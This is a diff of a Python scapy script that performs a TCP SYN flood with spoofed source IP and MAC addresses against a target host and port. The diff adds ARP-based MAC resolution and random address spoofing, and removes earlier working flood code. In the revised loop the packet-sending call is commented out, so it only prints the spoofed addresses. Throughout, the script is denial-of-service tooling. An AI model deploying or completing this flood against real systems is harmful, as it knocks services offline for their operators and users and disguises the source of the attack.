@@ -5,22 +5,21 @@ import sys
 import re
 import ipaddress
 import logging
+import time
 
 logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
-from scapy.all import Ether, IP, TCP, getmacbyip, conf
+from scapy.all import Ether, ARP, IP, TCP, srp, conf
 
 conf.verb = 0
 
-# IP address | MAC address --> all Hosts on the LAN
-NET_MAP = []
 
-def net_map(ip):
-	"""
-	Get all IP hosts that are alive and in same LAN as 'ip'.
-	Resolve MAC addresses. 
-	"""
-	global NET_MAP
-	#oct_1 = int(ip[:ip.index('.')])
+def get_mac_by_ip(ip_address):
+	responses,unanswered = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/\
+		ARP(pdst = ip_address), timeout = 2, retry = 10)
+	# return the MAC address from a response
+	for s,r in responses:
+		return r[Ether].src
+	return None
 
 def tcp_syn_flood(ip, mac, port, n):
 	"""
@@ -29,22 +28,18 @@ def tcp_syn_flood(ip, mac, port, n):
 	When this queue is full, the victim cannot take any more connection.
 	"""
 
-	if len(NET_MAP):
-		for i in range(n):
-			spoofed_ip, spoofed_mac = random.choice(NET_MAP)
-			# send a packet at Layer 2
-			sendp(\
-				Ether(dst=mac, src=spoofed_mac)/\
-					IP(dst=ip, src=spoofed_ip, flags='DF')/\
-						TCP(dport=port, sport=random.randint(1, 65535), flags='S')\
-				)
-	else:
-		for i in range(n):
-			# send a packet at Layer 3
-			send(\
-				IP(dst=ip, flags='DF')/\
-					TCP(dport=port, sport=random.randint(1, 65535), flags='S')\
-				)
+	for i in range(n):
+		spoofed_mac = ':'.join([ hex(i).lstrip('0x').rjust(2,'0') for i in random.sample(range(0x0, 0xff),6)])
+		spoofed_ip  = "{}.{}.{}.{}".format(*random.sample(range(1,254),4))
+		print(spoofed_ip, ":", spoofed_mac)
+		time.sleep(1)
+		# send a packet at Layer 2
+		#sendp(\
+		#	Ether(dst=mac, src=spoofed_mac)/\
+		#		IP(dst=ip, src=spoofed_ip, flags='DF')/\
+		#			TCP(dport=port, sport=random.randint(1, 65535), flags='S')\
+		#			)
+
 
 def parse_argv(argv):
 	"""
@@ -75,23 +70,19 @@ def parse_argv(argv):
 				print('[ ERROR ] -- Cannot use a Reserved address')
 				sys.exit()
 
-			mac = getmacbyip(ip_addr.exploded)
-			if mac:
-				net_map(ip_addr.exploded)
-				return (ip_addr.exploded, mac, res.port, res.n)
-			else:
-				print('\033[91m[ ERROR ] -- Could not resolve MAC address for [ %s ]' % ip_addr.exploded)
+			mac = get_mac_by_ip(ip_addr.exploded)
+			return (ip_addr.exploded, mac, res.port, res.n)
 		else:
 			sys.exit()
-	except:
-		#parser.print_help()
+	except Exception as e:
+		print(e)
 		sys.exit()
 
 if __name__ == '__main__':
 
 	ip, mac, port, n = parse_argv(sys.argv[1:])
 	if mac:
-		NET_MAP      = net_map(ip)
+		print(ip, ':', mac, end='\n\n')
 		tcp_syn_flood(ip=ip, mac=mac, port=port, n=n)
 	else:
 		print('\033[91m[ ERROR ] -- Could not resolve MAC address for [ %s ]' % ip)
